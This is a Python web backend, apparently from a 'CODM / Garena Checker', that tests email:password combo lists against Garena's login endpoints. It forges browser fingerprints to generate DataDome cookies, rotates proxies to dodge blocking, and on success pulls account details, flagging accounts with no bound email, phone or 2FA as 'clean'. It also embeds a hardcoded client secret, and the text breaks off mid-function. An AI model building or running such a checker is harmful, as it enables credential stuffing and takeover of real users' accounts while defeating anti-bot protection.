# ============================================================
#  routers/codm.py  —  CODM / Garena Checker Backend
#  v6.0 — Reference-enhanced release
#
#  BORROWED from METHODS.py reference:
#   + get_datadome_cookie(): auto-generates a fresh DataDome by
#     hitting dd.garena.com/js/ — no more manual admin input
#     when the pool is empty; called automatically as fallback
#   + Self-refreshing cookie pool: every prelogin/login response
#     is scanned for a new datadome in set-cookie headers and
#     auto-saved to Redis so the pool grows/refreshes itself
#   + Explicit cookie header injection (applyck-style): cookie
#     values are built into the request headers directly for
#     maximum compatibility, not just session cookies
#   + Richer parse_account_details(): adds username, nickname,
#     uid, account_status (Active/Inactive), authenticator_app,
#     suspicious flag, password_strength
#   + Stricter is_clean: len(binds)==0 AND email_verified==False
#     (matches reference — email_verified alone = not clean)
#
#  All v5.0 fixes are preserved:
#   - Cookie rotation (MAX_COOKIE_RETRIES)
#   - 3-tuple prelogin (v1, v2, reason)
#   - 403 = immediate blocked (no retry with dead cookie)
#   - Garena error code parsing
#   - delay=1 removed from cloudscraper
#   - DataDome set on both .garena.com domains
# ============================================================

import asyncio
import base64
import hashlib
import json
import logging
import os
import random
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from typing import Any, Dict, List, Optional, Tuple

import requests as _req
from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel

from auth import require_admin

logger = logging.getLogger(__name__)
router = APIRouter()

_executor = ThreadPoolExecutor(max_workers=10)

MAX_COOKIE_RETRIES = 3

try:
    import cloudscraper
    _HAS_CLOUDSCRAPER = True
except ImportError:
    _HAS_CLOUDSCRAPER = False
    logger.warning("cloudscraper not installed — CODM checker disabled")

try:
    from Crypto.Cipher import AES
    _HAS_CRYPTO = True
except ImportError:
    _HAS_CRYPTO = False
    logger.warning("pycryptodome not installed — CODM checker disabled")

# ── User-agents ───────────────────────────────────────────────
_UA_NEW = (
    "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 "
    "Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)"
)
_UA_OLD = (
    "Mozilla/5.0 (Linux; Android 11; RMX2195) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
)
_UA_SDK      = "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)"
_UA_DATADOME = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
)

_CLIENT_SECRET = "388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415"
_PRELOGIN_URL  = "https://100082.connect.garena.com/api/prelogin"
_PRELOGIN_HOST = "100082.connect.garena.com"

# Prelogin failure reasons
_REASON_OK        = None
_REASON_NOT_FOUND = "not_found"
_REASON_BLOCKED   = "blocked"
_REASON_CAPTCHA   = "captcha"
_REASON_ERROR     = "error"
_REASON_TIMEOUT   = "timeout"

# ── Redis ─────────────────────────────────────────────────────
_UPSTASH_URL       = os.getenv("UPSTASH_REDIS_REST_URL", "")
_UPSTASH_TOK       = os.getenv("UPSTASH_REDIS_REST_TOKEN", "")
_REDIS_KEY_COOKIES = "codm:cookies"
_REDIS_KEY_PROXIES = "codm:proxies"


def _redis_cmd(*args):
    if not _UPSTASH_URL or not _UPSTASH_TOK:
        return None
    try:
        r = _req.post(
            _UPSTASH_URL,
            headers={
                "Authorization": f"Bearer {_UPSTASH_TOK}",
                "Content-Type":  "application/json",
            },
            json=list(args),
            timeout=6,
        )
        return r.json().get("result")
    except Exception as e:
        logger.warning(f"Redis {args[0]} failed: {e}")
        return None


def _redis_get_list(key):
    raw = _redis_cmd("GET", key)
    if not raw:
        return []
    try:
        data = json.loads(raw)
        return data if isinstance(data, list) else []
    except Exception:
        return []


def _redis_set_list(key, items):
    return _redis_cmd("SET", key, json.dumps(items)) == "OK"


def _redis_del(key):
    return bool(_redis_cmd("DEL", key))


# ── Cookie pool ───────────────────────────────────────────────

def _get_all_cookies() -> List[str]:
    c = _redis_get_list(_REDIS_KEY_COOKIES)
    if c:
        return c
    raw = os.getenv("CODM_COOKIES", "")
    return [l.strip() for l in raw.splitlines() if l.strip()]


def _extract_dd_value(raw_line: str) -> Optional[str]:
    """Extract raw datadome value from 'datadome=XXX; Path=...' or bare value."""
    for part in raw_line.split(";"):
        part = part.strip()
        if part.lower().startswith("datadome="):
            return part.split("=", 1)[1].strip()
    return raw_line.strip() if raw_line.strip() else None


def _pick_datadome(exclude: Optional[set] = None) -> Optional[str]:
    """
    Pick a random DataDome cookie value from the pool, skipping excluded ones.
    Falls back to auto-generation via dd.garena.com if pool is empty.
    """
    lines = _get_all_cookies()
    candidates = [
        v for v in (_extract_dd_value(l) for l in lines)
        if v and (not exclude or v not in exclude)
    ]
    if not candidates and lines:
        candidates = [v for v in (_extract_dd_value(l) for l in lines) if v]
    if candidates:
        return random.choice(candidates)
    logger.info("Cookie pool empty — attempting auto-generation via dd.garena.com...")
    fresh = _auto_generate_datadome()
    if fresh:
        _save_fresh_cookie_to_redis(fresh)
        logger.info("Auto-generated DataDome saved to Redis pool.")
    return fresh


def _save_fresh_cookie_to_redis(datadome_value: str):
    """
    Appends a newly captured DataDome value to the Redis pool.
    Keeps at most 20 entries to avoid stale buildup.
    Borrowed concept from METHODS.py save_fresh_cookie().
    """
    try:
        existing  = _get_all_cookies()
        formatted = f"datadome={datadome_value}"
        if formatted not in existing:
            existing.append(formatted)
            if len(existing) > 20:
                existing = existing[-20:]
            _redis_set_list(_REDIS_KEY_COOKIES, existing)
    except Exception as e:
        logger.warning(f"Failed to save fresh DataDome to Redis: {e}")


def _extract_fresh_dd_from_response(response) -> Optional[str]:
    """
    Scans response cookies and set-cookie headers for a new DataDome value.
    Borrowed from METHODS.py prelogin() cookie extraction logic.
    """
    try:
        dd = response.cookies.get("datadome")
        if dd:
            return dd
        set_cookie = response.headers.get("set-cookie", "")
        for segment in set_cookie.split(","):
            for part in segment.split(";"):
                part = part.strip()
                if part.lower().startswith("datadome="):
                    val = part.split("=", 1)[1].strip()
                    if val:
                        return val
    except Exception:
        pass
    return None


# ── Auto DataDome generation (borrowed from METHODS.py) ───────

def _auto_generate_datadome() -> Optional[str]:
    """
    Hits dd.garena.com/js/ with a browser fingerprint payload to obtain
    a fresh DataDome cookie without needing an existing session.
    Borrowed directly from METHODS.py get_datadome_cookie().
    """
    url     = "https://dd.garena.com/js/"
    headers = {
        "accept":             "*/*",
        "accept-encoding":    "gzip, deflate, br, zstd",
        "accept-language":    "en-US,en;q=0.9",
        "cache-control":      "no-cache",
        "content-type":       "application/x-www-form-urlencoded",
        "origin":             "https://account.garena.com",
        "pragma":             "no-cache",
        "referer":            "https://account.garena.com/",
        "sec-ch-ua":          '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        "sec-ch-ua-mobile":   "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest":     "empty",
        "sec-fetch-mode":     "cors",
        "sec-fetch-site":     "same-site",
        "user-agent":         _UA_DATADOME,
    }
    js_data = {
        "ttst": 76.70000004768372, "ifov": False, "hc": 4,
        "br_oh": 824, "br_ow": 1536, "ua": _UA_DATADOME,
        "wbd": False, "dp0": True, "tagpu": 5.738121195951787,
        "wdif": False, "wdifrm": False, "npmtm": False,
        "br_h": 738, "br_w": 260, "isf": False, "nddc": 1,
        "rs_h": 864, "rs_w": 1536, "rs_cd": 24, "phe": False,
        "nm": False, "jsf": False, "lg": "en-US", "pr": 1.25,
        "ars_h": 824, "ars_w": 1536, "tz": -480,
        "str_ss": True, "str_ls": True, "str_idb": True, "str_odb": False,
        "plgod": False, "plg": 5, "plgne": True, "plgre": True,
        "plgof": False, "plggt": False, "pltod": False,
        "hcovdr": False, "hcovdr2": False, "plovdr": False, "plovdr2": False,
        "ftsovdr": False, "ftsovdr2": False, "lb": False,
        "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False,
        "vnd": "Google Inc.", "bid": "NA",
        "mmt": "application/pdf,text/pdf",
        "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
        "hdn": False, "awe": False, "geb": False, "dat": False,
        "med": "defined", "aco": "probably", "acots": False,
        "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False,
        "acma": "maybe", "acmats": False, "acaa": "probably", "acaats": True,
        "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False,
        "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False,
        "acwm": "maybe", "acwmts": False, "ocpt": False, "vco": "", "vcots": False,
        "vch": "probably", "vchts": True, "vcw": "probably", "vcwts": True,
        "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False,
        "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True,
        "dvm": 8, "sqt": False, "so": "landscape-primary",
        "bda": False, "wdw": True, "prm": True, "tzp": True,
        "cvs": True, "usb": True, "cap": True, "tbf": False, "lgs": True,
        "tpd": True,
    }
    payload = {
        "jsData":        json.dumps(js_data),
        "eventCounters": "[]",
        "jsType":        "ch",
        "cid":           "KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae",
        "ddk":           "AE3F04AD3F0D3A462481A337485081",
        "Referer":       "https://account.garena.com/",
        "request":       "/",
        "responsePage":  "origin",
        "ddv":           "4.35.4",
    }
    data = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in payload.items())
    try:
        response = _req.post(url, headers=headers, data=data, timeout=15)
        response.raise_for_status()
        rj = response.json()
        if rj.get("status") == 200 and "cookie" in rj:
            parts = rj["cookie"].split(";")[0].split("=", 1)
            if len(parts) == 2:
                return parts[1].strip()
        logger.warning(f"DataDome auto-gen unexpected response: {rj.get('status')}")
    except Exception as e:
        logger.warning(f"DataDome auto-gen failed: {e}")
    return None


# ── Proxy pool ────────────────────────────────────────────────

def _get_all_proxies() -> List[str]:
    return _redis_get_list(_REDIS_KEY_PROXIES)

def _pick_proxy(override=None) -> Optional[str]:
    if override and override.strip():
        return override.strip()
    pool = _get_all_proxies()
    return random.choice(pool) if pool else None

def _proxy_dict(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if not proxy_str.startswith(("http://", "https://", "socks5://", "socks4://")):
        proxy_str = f"http://{proxy_str}"
    return {"http": proxy_str, "https": proxy_str}


# ── Crypto ────────────────────────────────────────────────────

def _md5(s: str) -> str:
    return hashlib.md5(urllib.parse.unquote(s).encode()).hexdigest()

def _sha256(s: str) -> str:
    return hashlib.sha256(s.encode()).hexdigest()

def _aes_ecb(passmd5: str, outer_hash: str) -> str:
    cipher = AES.new(bytes.fromhex(outer_hash), AES.MODE_ECB)
    return cipher.encrypt(bytes.fromhex(passmd5)).hex()[:32]

def hash_password(password: str, v1: str, v2: str) -> str:
    passmd5 = _md5(password)
    return _aes_ecb(passmd5, _sha256(_sha256(passmd5 + v1) + v2))

def _gen_uuid() -> str:
    r = list(os.urandom(16))
    r[6] = (r[6] & 0x0F) | 0x40
    r[8] = (r[8] & 0x3F) | 0x80
    parts = [r[0:4], r[4:6], r[6:8], r[8:10], r[10:16]]
    return "-".join("".join(f"{b:02x}" for b in g) for g in parts)


# ── Cookie header builder (borrowed from METHODS.py applyck) ──

def _build_cookie_header(session, extra_dd: Optional[str] = None) -> str:
    """
    Builds an explicit Cookie header string (METHODS.py applyck style).
    Injects datadome, apple_state_key, sso_key in preferred order.
    """
    current = dict(session.cookies)
    if extra_dd:
        current["datadome"] = extra_dd
    parts = []
    for key in ("datadome", "apple_state_key", "sso_key"):
        if current.get(key):
            parts.append(f"{key}={current[key]}")
    for key, val in current.items():
        if key not in ("datadome", "apple_state_key", "sso_key") and val:
            parts.append(f"{key}={val}")
    return "; ".join(parts)


# ── Session factory ───────────────────────────────────────────

def _make_session(datadome: Optional[str] = None, proxy: Optional[str] = None):
    proxies = _proxy_dict(proxy)
    session = cloudscraper.create_scraper(
        browser={"browser": "chrome", "platform": "android", "mobile": True},
    )
    session.headers.update({"Accept-Encoding": "gzip, deflate, br, zstd"})
    if datadome:
        session.cookies.set("datadome", datadome, domain=".garena.com")
        session.cookies.set("datadome", datadome, domain=".connect.garena.com")
    if proxies:
        session.proxies.update(proxies)
    return session


# ── Garena steps ──────────────────────────────────────────────

def _prelogin(
    session, account: str, datadome: Optional[str] = None
) -> Tuple[Optional[str], Optional[str], Optional[str]]:
    """
    Returns (v1, v2, reason).
    v6.0 improvements:
    + Explicit Cookie header injection
    + Auto-captures fresh DataDome from set-cookie headers and saves to Redis
    + 403 with new DataDome in headers = use it and retry once
    """
    for attempt in range(3):
        try:
            ts         = int(time.time() * 1000)
            cookie_hdr = _build_cookie_header(session, extra_dd=datadome)
            headers    = {
                "Accept":             "application/json, text/plain, */*",
                "Accept-Language":    "en-US,en;q=0.9",
                "Accept-Encoding":    "gzip, deflate, br, zstd",
                "Connection":         "keep-alive",
                "Host":               _PRELOGIN_HOST,
                "User-Agent":         _UA_NEW,
                "X-Requested-With":   "com.garena.game.codm",
                "Referer":            (
                    "https://100082.connect.garena.com/universal/oauth"
                    "?client_id=100082&locale=en-US&create_grant=true"
                    "&login_scenario=normal&redirect_uri=gop100082://auth/"
                    "&response_type=code"
                ),
                "sec-ch-ua":          '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
                "sec-ch-ua-mobile":   "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest":     "empty",
                "sec-fetch-mode":     "cors",
                "sec-fetch-site":     "same-origin",
            }
            if cookie_hdr:
                headers["Cookie"] = cookie_hdr

            res = session.get(
                _PRELOGIN_URL,
                headers=headers,
                params={"app_id": "100082", "account": account, "format": "json", "id": str(ts)},
                timeout=12,
            )

            # Auto-capture any fresh DataDome from this response
            fresh_dd = _extract_fresh_dd_from_response(res)
            if fresh_dd and fresh_dd != datadome:
                logger.info("Auto-captured fresh DataDome from prelogin response — saving to pool")
                _save_fresh_cookie_to_redis(fresh_dd)
                session.cookies.set("datadome", fresh_dd, domain=".garena.com")
                session.cookies.set("datadome", fresh_dd, domain=".connect.garena.com")
                datadome = fresh_dd

            if res.status_code == 403:
                if fresh_dd and attempt < 2:
                    logger.info(f"403 with fresh DataDome — retrying prelogin (attempt {attempt + 1})")
                    time.sleep(1)
                    continue
                logger.warning(f"Prelogin 403 for {account[:20]}... — cookie stale/blocked")
                return None, None, _REASON_BLOCKED

            if res.status_code != 200:
                logger.warning(f"Prelogin HTTP {res.status_code} for {account[:20]}...")
                time.sleep(1)
                continue

            try:
                data = res.json()
            except Exception:
                logger.warning(f"Prelogin non-JSON for {account[:20]}...: {res.text[:200]}")
                time.sleep(1)
                continue

            if "error" in data:
                err_raw  = str(data.get("error", "")).lower()
                err_code = str(data.get("error_code", "")).lower()
                err_msg  = str(data.get("msg", data.get("message", ""))).lower()
                combined = f"{err_raw} {err_code} {err_msg}"
                logger.info(f"Prelogin Garena error for {account[:20]}...: {data}")

                if any(k in combined for k in (
                    "not_exist", "not_found", "no_account", "invalid_account",
                    "account_not", "does not exist", "no such account",
                    "account doesnt exist",
                )):
                    return None, None, _REASON_NOT_FOUND

                if any(k in combined for k in ("captcha", "verify", "human")):
                    if attempt < 2:
                        time.sleep(2)
                        continue
                    return None, None, _REASON_CAPTCHA

                if any(k in combined for k in (
                    "block", "forbid", "rate", "limit", "bot", "spam",
                    "too many", "suspicious",
                )):
                    return None, None, _REASON_BLOCKED

                return None, None, _REASON_ERROR

            v1 = data.get("v1")
            v2 = data.get("v2")
            if v1 and v2:
                return v1, v2, _REASON_OK

            logger.warning(f"Prelogin unexpected response for {account[:20]}...: {data}")
            time.sleep(1)

        except Exception as e:
            logger.warning(f"Prelogin attempt {attempt + 1} exception: {e}")
            time.sleep(1)

    return None, None, _REASON_TIMEOUT


def _login(session, account: str, password: str, v1: str, v2: str):
    hashed_pw = hash_password(password, v1, v2)
    for attempt in range(2):
        try:
            ts         = int(time.time() * 1000)
            cookie_hdr = _build_cookie_header(session)
            headers    = {
                "Accept":             "application/json, text/plain, */*",
                "Host":               _PRELOGIN_HOST,
                "User-Agent":         _UA_NEW,
                "X-Requested-With":   "com.garena.game.codm",
                "Referer":            (
                    "https://100082.connect.garena.com/universal/oauth"
                    "?client_id=100082&locale=en-US&create_grant=true"
                    "&login_scenario=normal&redirect_uri=gop100082://auth/"
                    "&response_type=code"
                ),
                "sec-ch-ua":          '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
                "sec-ch-ua-mobile":   "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest":     "empty",
                "sec-fetch-mode":     "cors",
                "sec-fetch-site":     "same-origin",
            }
            if cookie_hdr:
                headers["Cookie"] = cookie_hdr

            res = session.get(
                "https://100082.connect.garena.com/api/login",
                headers=headers,
                params={
                    "app_id": "100082", "account": account, "password": hashed_pw,
                    "redirect_uri": "gop100082://auth/", "format": "json", "id": str(ts),
                },
                timeout=12,
            )

            # Capture fresh DataDome + other cookies from login response
            fresh_dd = _extract_fresh_dd_from_response(res)
            if fresh_dd:
                _save_fresh_cookie_to_redis(fresh_dd)
                session.cookies.set("datadome", fresh_dd, domain=".garena.com")
            for name in ("sso_key", "apple_state_key", "datadome"):
                val = res.cookies.get(name)
                if val:
                    session.cookies.set(name, val, domain=".garena.com")

            if res.status_code != 200:
                time.sleep(1)
                continue

            data = res.json()
            if "error" in data:
                err = str(data.get("error", "")).lower()
                if "captcha" in err:
                    time.sleep(2)
                    continue
                return None, "wrong_password"

            sso_key = (
                data.get("sso_key")
                or res.cookies.get("sso_key")
                or session.cookies.get("sso_key")
            )
            if sso_key:
                session.cookies.set("sso_key", sso_key, domain=".garena.com")
                return sso_key, "ok"

        except Exception as e:
            logger.warning(f"Login attempt {attempt + 1}: {e}")
            time.sleep(1)
    return None, "failed"


def _account_info(session, sso_key: str) -> Optional[Dict[str, Any]]:
    try:
        session.cookies.set("sso_key", sso_key, domain=".garena.com")
        cookie_hdr = _build_cookie_header(session)
        headers = {
            "Accept":     "application/json",
            "User-Agent": _UA_NEW,
            "Referer":    "https://account.garena.com/",
        }
        if cookie_hdr:
            headers["Cookie"] = cookie_hdr
        res = session.get(
            "https://account.garena.com/api/account/init",
            headers=headers, timeout=12,
        )
        if res.status_code == 403:
            logger.warning("account/init 403 — possible security ban")
            return None
        if res.status_code == 200:
            return res.json()
    except Exception as e:
        logger.warning(f"Account info: {e}")
    return None


def _codm_token_new(session, sso_key: str) -> Optional[str]:
    try:
        ts = str(int(time.time() * 1000))
        session.cookies.set("sso_key", sso_key, domain=".connect.garena.com")
        grant_res = session.post(
            "https://100082.connect.garena.com/oauth/token/grant",
            headers={
                "Host": _PRELOGIN_HOST, "User-Agent": _UA_NEW,
                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
                "Origin": "https://100082.connect.garena.com",
                "X-Requested-With": "com.garena.game.codm",
                "Referer": (
                    "https://100082.connect.garena.com/universal/oauth"
                    "?client_id=100082&locale=en-US&create_grant=true"
                    "&login_scenario=normal&redirect_uri=gop100082://auth/"
                    "&response_type=code"
                ),
            },
            data=urllib.parse.urlencode({
                "client_id": "100082", "response_type": "code",
                "redirect_uri": "gop100082://auth/", "create_grant": "true",
                "login_scenario": "normal", "format": "json", "id": ts,
            }),
            timeout=12,
        )
        grant_res.raise_for_status()
        auth_code = grant_res.json().get("code")
        if not auth_code:
            return None
        exchange_res = session.post(
            "https://100082.connect.garena.com/oauth/token/exchange",
            headers={
                "User-Agent": _UA_SDK, "Content-Type": "application/x-www-form-urlencoded",
                "Host": _PRELOGIN_HOST, "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
            },
            data=urllib.parse.urlencode({
                "grant_type": "authorization_code", "code": auth_code,
                "device_id": f"02-{_gen_uuid()}", "redirect_uri": "gop100082://auth/",
                "source": "2", "client_id": "100082", "client_secret": _CLIENT_SECRET,
            }),
            timeout=12,
        )
        exchange_res.raise_for_status()
        return exchange_res.json().get("access_token")
    except Exception as e:
        logger.warning(f"CODM new token: {e}")
        return None


def _codm_token_old(session) -> Optional[str]:
    try:
        ts = str(int(time.time() * 1000))
        res = session.post(
            "https://auth.garena.com/oauth/token/grant",
            headers={
                "User-Agent": _UA_OLD, "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": (
                    "https://auth.garena.com/universal/oauth?all_platforms=1"
                    "&response_type=token&locale=en-SG&client_id=100082"
                    "&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n"
                    "?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
                ),
            },
            data=(
                "client_id=100082&response_type=token"
                "&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n"
                "%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F"
                f"&format=json&id={ts}"
            ),
            timeout=12,
        )
        return res.json().get("access_token")
    except Exception as e:
        logger.warning(f"CODM old token: {e}")
        return None


def _codm_callback(session, access_token: str, old_flow: bool = False) -> Optional[Dict]:
    bases = (
        ["https://api-delete-request.codm.garena.co.id"] if old_flow
        else [
            "https://api-delete-request-aos.codm.garena.co.id",
            "https://api-delete-request.codm.garena.co.id",
        ]
    )
    for base in bases:
        try:
            res = session.get(
                f"{base}/oauth/callback/?access_token={access_token}",
                headers={
                    "Accept":           "text/html,application/xhtml+xml,*/*",
                    "Accept-Language":  "en-US,en;q=0.9",
                    "Cache-Control":    "no-cache",
                    "Pragma":           "no-cache",
                    "Referer":          "https://auth.garena.com/",
                    "User-Agent":       _UA_OLD if old_flow else _UA_NEW,
                    "X-Requested-With": "com.garena.game.codm",
                    "sec-ch-ua":        '"Chromium";v="107", "Not=A?Brand";v="24"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-fetch-mode":   "navigate",
                    "sec-fetch-site":   "cross-site",
                    "upgrade-insecure-requests": "1",
                },
                timeout=12,
                allow_redirects=False,
            )
            loc = res.headers.get("location", "")
            if "err=3" in loc:
                return {"status": "no_codm"}
            if "token=" in loc:
                tok = urllib.parse.parse_qs(
                    urllib.parse.urlparse(loc).query
                ).get("token", [""])[0]
                if tok:
                    return {"status": "ok", "token": tok}
        except Exception as e:
            logger.warning(f"Callback {base}: {e}")
    return None


def _codm_user_info(session, token: str, old_flow: bool = False) -> Dict:
    # Try JWT decode first
    try:
        parts = token.split(".")
        if len(parts) == 3:
            p       = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)
            payload = json.loads(base64.urlsafe_b64decode(p))
            user    = payload.get("user")
            if user:
                return user
    except Exception:
        pass

    base = (
        "https://api-delete-request.codm.garena.co.id" if old_flow
        else "https://api-delete-request-aos.codm.garena.co.id"
    )
    try:
        res = session.get(
            f"{base}/oauth/check_login/",
            headers={
                "accept":             "application/json, text/plain, */*",
                "accept-language":    "en-US,en;q=0.9",
                "accept-encoding":    "gzip, deflate, br, zstd",
                "cache-control":      "no-cache",
                "codm-delete-token":  token,
                "origin":             "https://delete-request.codm.garena.co.id",
                "pragma":             "no-cache",
                "referer":            "https://delete-request.codm.garena.co.id/",
                "User-Agent":         _UA_OLD if old_flow else _UA_NEW,
                "X-Requested-With":   "XMLHttpRequest",
                "x-requested-with":   "com.garena.game.codm",
                "sec-ch-ua":          '"Chromium";v="107", "Not=A?Brand";v="24"',
                "sec-ch-ua-mobile":   "?1",
                "sec-fetch-dest":     "empty",
                "sec-fetch-mode":     "cors",
                "sec-fetch-site":     "same-site",
            },
            timeout=12,
        )
        return res.json().get("user", {})
    except Exception as e:
        logger.warning(f"User info: {e}")
        return {}


# ── Account detail parser (enhanced from METHODS.py) ──────────

def _parse_account(data: Dict) -> Dict:
    """
    Enhanced parser borrowing from METHODS.py parse_account_details().
    New fields: username, nickname, uid, account_status, security_status,
                authenticator_app, suspicious, pw_strength, mobile_bound,
                email_verified.
    Stricter is_clean: len(binds)==0 AND NOT email_verified.
    """
    u = data.get("user_info", data)

    email       = str(u.get("email", "") or "")
    mobile      = str(u.get("mobile_no", "") or "")
    email_v     = u.get("email_v") in (1, True)
    fb          = u.get("is_fbconnect_enabled") in (1, True)
    id_card     = str(u.get("idcard", "") or "")
    two_step    = u.get("two_step_verify_enable") in (1, True)
    auth_app    = u.get("authenticator_enable") in (1, True)
    suspicious  = u.get("suspicious") in (1, True)
    acct_status = "Active" if u.get("status", 0) == 1 else "Inactive"
    pw_strength = u.get("password_s", "N/A")
    mobile_bound = bool(u.get("mobile_binding_status", 0) and mobile)

    binds: List[str] = []
    if email_v or (email and not email.startswith("*") and "@" in email and "**" not in email):
        binds.append("Email")
    if mobile and mobile.strip() and mobile not in ("N/A", ""):
        binds.append("Phone")
    if fb:
        binds.append("Facebook")
    if id_card and id_card.strip() and id_card not in ("N/A", ""):
        binds.append("ID Card")
    if two_step:
        binds.append("2FA")
    if auth_app:
        binds.append("Auth App")

    # METHODS.py standard: clean = no binds AND email not verified
    is_clean = len(binds) == 0 and not email_v

    sec: List[str] = []
    if two_step:   sec.append("2FA")
    if auth_app:   sec.append("Auth App")
    if suspicious: sec.append("⚠️ Suspicious")
    security_status = "Normal" if not sec else " | ".join(sec)

    return {
        "shell":           str(u.get("shell", 0)),
        "country":         str(u.get("acc_country", "") or ""),
        "is_clean":        is_clean,
        "binds":           binds,
        "two_step":        two_step,
        "email":           email,
        "uid":             str(u.get("uid", "") or ""),
        "username":        str(u.get("username", "") or ""),
        "nickname":        str(u.get("nickname", "") or ""),
        "account_status":  acct_status,
        "security_status": security_status,
        "suspicious":      suspicious,
        "pw_strength":     str(pw_strength),
        "mobile_bound":    mobile_bound,
        "email_verified":  email_v,
    }


_EMPTY_ACC: Dict = {
    "shell": "", "country": "", "is_clean": False, "binds": [],
    "uid": "", "username": "", "nickname": "", "account_status": "",
    "security_status": "", "suspicious": False,
}


# ── Pydantic models ───────────────────────────────────────────

class CheckOneRequest(BaseModel):
    combo:   str
    user_id: Optional[str] = None
    proxy:   Optional[str] = None

class CheckOneResponse(BaseModel):
    combo: str; status: str; detail: str = ""
    nickname: str = ""; level: str = ""; region: str = ""
    uid: str = ""; shell: str = ""; country: str = ""
    is_clean: bool = False; binds: list = []
    account_status:  str = ""
    security_status: str = ""
    suspicious:      bool = False
    username:        str = ""

class CookieUpdateRequest(BaseModel):
    cookies: List[str]

class ProxyUpdateRequest(BaseModel):
    proxies: List[str]


# ── Main check logic ──────────────────────────────────────────

def _do_check_sync(req: CheckOneRequest) -> CheckOneResponse:
    combo = req.combo.strip()
    if ":" not in combo:
        return CheckOneResponse(combo=combo, status="error", detail="Bad format — use email:password")

    # Support email:pass and url:email:pass (METHODS.py main() style)
    parts = combo.split(":")
    if len(parts) == 3:
        _, account, password = parts
    elif len(parts) == 2:
        account, password = parts
    else:
        return CheckOneResponse(combo=combo, status="error",
            detail="Bad format — expected email:password or url:email:password")

    account  = account.strip()
    password = password.strip()
    if not account or not password:
        return CheckOneResponse(combo=combo, status="error", detail="Empty account or password")

    proxy = _pick_proxy(req.proxy)
    tried_cookies: set = set()
    last_reason = _REASON_ERROR
    v1 = v2 = None
    session = None

    for cookie_attempt in range(MAX_COOKIE_RETRIES):
        datadome = _pick_datadome(exclude=tried_cookies)
        if datadome:
            tried_cookies.add(datadome)

        if session is not None:
            try:
                session.close()
            except Exception:
                pass

        session = _make_session(datadome, proxy)
        v1, v2, reason = _prelogin(session, account, datadome)
        last_reason = reason

        if reason is _REASON_OK:
            break

        if reason == _REASON_NOT_FOUND:
            try:
                session.close()
            except Exception:
                pass
            return CheckOneResponse(combo=combo, status="bad", detail="Account does not exist")

        if reason == _REASON_BLOCKED:
            logger.info(f"Prelogin blocked (attempt {cookie_attempt + 1}/{MAX_COOKIE_RETRIES})")
            if cookie_attempt < MAX_COOKIE_RETRIES - 1:
                if cookie_attempt == MAX_COOKIE_RETRIES - 2:
                    logger.info("Last retry — attempting auto-generation of fresh DataDome...")
                    fresh = _auto_generate_datadome()
                    if fresh:
                        _save_fresh_cookie_to_redis(fresh)
                        tried_cookies.discard(fresh)
                continue
            try:
                session.close()
            except Exception:
                pass
            total = len(_get_all_cookies())
            return CheckOneResponse(combo=combo, status="bad",
                detail=(
                    f"DataDome expired or IP blocked "
                    f"(tried {min(cookie_attempt + 1, total or 1)} cookie(s)) — "
                    "add fresh DataDome cookies in admin panel or enable proxy"
                ))

        if reason == _REASON_CAPTCHA:
            try:
                session.close()
            except Exception:
                pass
            return CheckOneResponse(combo=combo, status="error",
                detail="Garena requires CAPTCHA verification — try again later or use proxy")

        if reason == _REASON_TIMEOUT:
            try:
                session.close()
            except Exception:
                pass
            return CheckOneResponse(combo=combo, status="error",
                detail="Prelogin timed out — Garena is slow or unreachable. Try again.")

    if not v1 or not v2:
        try:
            session.close()
        except Exception:
            pass
        return CheckOneResponse(combo=combo, status="error",
            detail=f"Prelogin failed after {MAX_COOKIE_RETRIES} attempts ({last_reason})")

    # ── Login flow ────────────────────────────────────────────
    try:
        sso_key, _ = _login(session, account, password, v1, v2)
        if not sso_key:
            return CheckOneResponse(combo=combo, status="bad",
                detail="Wrong password or account suspended")

        info = _account_info(session, sso_key)
        if info and "error" in info:
            err_type = str(info.get("error", "")).lower()
